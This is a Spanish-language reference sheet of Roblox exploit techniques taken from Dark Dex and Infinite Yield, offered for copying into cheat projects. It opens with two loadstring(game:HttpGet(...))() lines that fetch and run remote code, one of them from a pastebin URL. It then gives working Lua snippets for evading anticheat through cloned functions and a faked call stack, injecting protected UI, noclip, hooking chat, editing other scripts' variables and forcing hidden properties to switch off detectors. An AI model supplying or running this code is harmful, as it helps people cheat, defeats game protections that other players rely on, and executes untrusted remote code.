# 📚 Base de Datos de Funciones (DB) - Diccionario de Técnicas
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

loadstring(game:HttpGet('https://pastebin.com/raw/SySbaMGp'))()




Este documento contiene las técnicas y funciones maestras extraídas de `Dark Dex`, `Infinite Yield` y `Code.lua`. Puedes copiar, pegar y reciclar estas funciones en tus escáneres y proyectos para manipular el cliente de Roblox de forma avanzada y evasiva.

---

## 🛠️ Técnicas Base (Evasión y Anticheat)
*Extraído de `code.lua` y `secure.lua`*

### Bypass de Entorno Seguro (Anti-Poisoning)
Evita que el script sea víctima de funciones falsificadas por el anticheat.
```lua
local realGame = workspace.Parent or game
local cloneref = (type(cloneref) == "function" and cloneref) or function(...) return ... end
local GetService = clonefunction(realGame.GetService)
local CoreGui = cloneref(GetService(realGame, "CoreGui"))
```

### Ocultamiento de Hilos (Fake Call Stack)
Si el anticheat usa `getcallingscript()`, esto le hace creer que eres un script legítimo de Roblox.
```lua
local originalGetCallingScript = getcallingscript
getcallingscript = function()
    local calling = originalGetCallingScript()
    if calling == nil then
        pcall(function() calling = game:GetService("StarterPlayer").StarterPlayerScripts end)
    end
    return calling
end
```

---

## 👁️ Técnicas de Inspección (Scanners y GUI)
*Extraído de `Dark Dex`*

### Búsqueda Segura Iterativa
Encontrar objetos ocultos (Nil) sin alertar metatablas restrictivas.
```lua
local function GetHiddenInstances()
    if getnilinstances then
        return getnilinstances()
    end
    -- Fallback seguro
    local nils = {}
    for _, obj in ipairs(getinstances()) do
        if obj.Parent == nil then table.insert(nils, obj) end
    end
    return nils
end
```

### Inyección de Interfaz Inmune
Protege la UI para que scripts del juego (o anticheats) no puedan indexarla.
```lua
local function CreateProtectedUI(name)
    local gui = Instance.new("ScreenGui")
    gui.Name = name
    gui.ResetOnSpawn = false
    
    -- Intenta métodos de exploit avanzados primero
    if gethui then
        gui.Parent = gethui()
    elseif syn and syn.protect_gui then
        syn.protect_gui(gui)
        gui.Parent = game:GetService("CoreGui")
    else
        gui.Parent = game:GetService("CoreGui")
    end
    return gui
end
```

---

## 🚀 Técnicas de Manipulación del Jugador (Player Mods)
*Extraído de `Infinite Yield`*

### Noclip (Atravesar Paredes) Seguro
Yield usa el bucle `Stepped` de RunService para anular las colisiones (`CanCollide`) continuamente, sobreescribiendo el sistema de físicas de Roblox sin borrar piezas.
```lua
local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer

local noclipConnection
local function ToggleNoclip(state)
    if state then
        noclipConnection = RunService.Stepped:Connect(function()
            if player.Character then
                for _, part in ipairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") and part.CanCollide then
                        part.CanCollide = false
                    end
                end
            end
        end)
    else
        if noclipConnection then noclipConnection:Disconnect() end
    end
end
```

### Interceptación del Chat (Comandos Invisibles)
Yield intercepta el evento de chat antes de que llegue al servidor, permitiendo comandos que el servidor nunca registra.
```lua
local function HookChat(commandPrefix, callbackFunc)
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    LocalPlayer.Chatted:Connect(function(msg)
        if msg:sub(1, #commandPrefix) == commandPrefix then
            -- Cancela la propagación a otros si hay soporte
            -- (Nota: Dependiendo del executor requiere manipulación de metatablas para bloquear FireServer('SayMessageRequest'))
            local args = msg:sub(#commandPrefix + 1):split(" ")
            callbackFunc(args)
        end
    end)
end
```

### Manipulación de la Cámara (View/Spectate)
Forzar a la cámara local a renderizar desde la perspectiva de otro jugador u objeto, puenteando scripts de cámara customizados.
```lua
local function Spectate(targetPlayer)
    local workspace = game:GetService("Workspace")
    local camera = workspace.CurrentCamera
    
    camera.CameraSubject = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    camera.CameraType = Enum.CameraType.Custom
end
```

---

## 🔒 Control de Propiedades y Scripts Internos
*Nuevas Adiciones al Framework (`Secure.Instance` & `Secure.Scripts`)*

### Extraer y Editar Variables de Otros Scripts (getsenv)
Sirve para entrar a scripts del juego (armas, stamina, anticheats locales) y modificar sus valores.
```lua
local function EditScriptVariable(scriptInstance, varName, newValue)
    if getsenv then
        local env = getsenv(scriptInstance)
        if env and type(env) == "table" and env[varName] ~= nil then
            env[varName] = newValue
            print("Variable modificada con éxito.")
        end
    end
end
```

### Forzar Propiedades Ocultas (sethiddenproperty)
Útil para apagar detectores u obtener datos de red ocultos (`NetworkIsSleeping`, configuraciones de físicas restringidas).
```lua
local function ModHiddenProperty(instance, propertyName, value)
    if sethiddenproperty then
        sethiddenproperty(instance, propertyName, value)
    elseif setscriptable then
        setscriptable(instance, propertyName, true)
        instance[propertyName] = value
    end
end
```
